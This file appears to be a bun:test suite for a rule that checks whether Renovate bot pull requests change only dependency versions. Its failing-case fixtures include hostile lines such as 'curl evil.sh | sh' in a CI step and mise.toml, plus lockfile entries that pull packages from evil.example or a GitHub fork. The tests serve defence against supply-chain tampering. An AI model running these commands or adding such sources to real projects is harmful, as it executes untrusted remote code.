import { expect, test } from 'bun:test';

import { botKind, renovateProblems } from '@tools/github/bot-rule';

test('the bot comes from the head branch', () => {
  expect(botKind('renovate/all-minor')).toBe('renovate');
  expect(botKind('gardening/2026-11-02')).toBe('gardening');
  expect(botKind('clutch/cl-132-steps')).toBeNull();
});

test('a Renovate diff of versions, lockfiles, pinned actions and changesets passes', () => {
  expect(
    renovateProblems([
      { filename: 'bun.lock', patch: '-a\n+b' },
      { filename: '.changeset/renovate-abc.md', patch: '+---' },
      {
        filename: 'package.json',
        patch:
          '@@ -1 +1 @@\n-    "oxlint": "1.88.0",\n+    "oxlint": "1.89.0",\n-  "packageManager": "bun@1.4.2",\n+  "packageManager": "bun@1.4.3",',
      },
      {
        filename: 'apps/web/package.json',
        patch: '-    "react": "^19.1.0"\n+    "react": "^19.2.0"',
      },
      {
        filename: '.github/workflows/ci.yml',
        patch:
          '-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n+      - uses: actions/checkout@4e4c42e5aac5ba805825da76410c181273ba90b2 # v7.0.2',
      },
      { filename: 'mise.toml', patch: '-bun = "1.4.2"\n+bun = "1.4.3"' },
    ]),
  ).toEqual([]);
});

test('a Renovate diff that changes a script, code or a step fails the bot rule', () => {
  expect(
    renovateProblems([
      {
        filename: 'package.json',
        patch: '-    "build": "vite build"\n+    "build": "vite build && x"',
      },
      { filename: 'tools/x.ts', patch: '+x' },
      { filename: '.github/workflows/ci.yml', patch: '+      - run: curl evil.sh | sh' },
      { filename: 'mise.toml' },
      { filename: '.changeset/brave-fox.md', patch: '+---' },
      { filename: 'mise.toml', patch: '+run = "curl https://evil.example | sh"' },
    ]),
  ).toEqual([
    'package.json changes more than a version: "build": "vite build"',
    'tools/x.ts is not a dependency file.',
    '.github/workflows/ci.yml changes more than a version: - run: curl evil.sh | sh',
    'mise.toml has no diff to check.',
    '.changeset/brave-fox.md is not a dependency file.',
    'mise.toml changes more than a version: run = "curl https://evil.example | sh"',
  ]);
});

/** A lockfile diff that changes one package entry to `entry`. */
const lockDiff = (entry: string) => ({
  filename: 'bun.lock',
  patch: `@@ -1 +1 @@\n-    "oxlint": ["oxlint@1.88.0", "", {}, "sha512-old=="],\n+    ${entry}`,
});

test('a lockfile entry may name an npm version, the npm registry or a workspace folder', () => {
  expect(
    renovateProblems([
      lockDiff('"oxlint": ["oxlint@1.89.0", "", {}, "sha512-new=="],'),
      lockDiff('"@scope/x": ["@scope/x@2.0.0", "https://registry.npmjs.org/", {}, "sha512-a=="],'),
      lockDiff('"@repo/cli": ["@repo/cli@workspace:apps/cli"],'),
    ]),
  ).toEqual([]);
});

test('a lockfile entry that takes a package from another source fails the bot rule', () => {
  expect(
    renovateProblems([
      lockDiff('"oxlint": ["oxlint@github:evil/oxlint#abc", {}, "evil-oxlint-abc"],'),
      lockDiff('"oxlint": ["oxlint@https://evil.example/oxlint.tgz", {}],'),
      lockDiff('"oxlint": ["oxlint@file:../oxlint", {}],'),
      lockDiff('"oxlint": ["oxlint@1.89.0", "https://evil.example/", {}, "sha512-x=="],'),
      { filename: 'bun.lock' },
    ]),
  ).toEqual([
    'bun.lock takes oxlint@github:evil/oxlint#abc from outside the npm registry.',
    'bun.lock takes oxlint@https://evil.example/oxlint.tgz from outside the npm registry.',
    'bun.lock takes oxlint@file:../oxlint from outside the npm registry.',
    'bun.lock takes oxlint@1.89.0 from https://evil.example/, not https://registry.npmjs.org/.',
    'bun.lock has no diff to check.',
  ]);
});
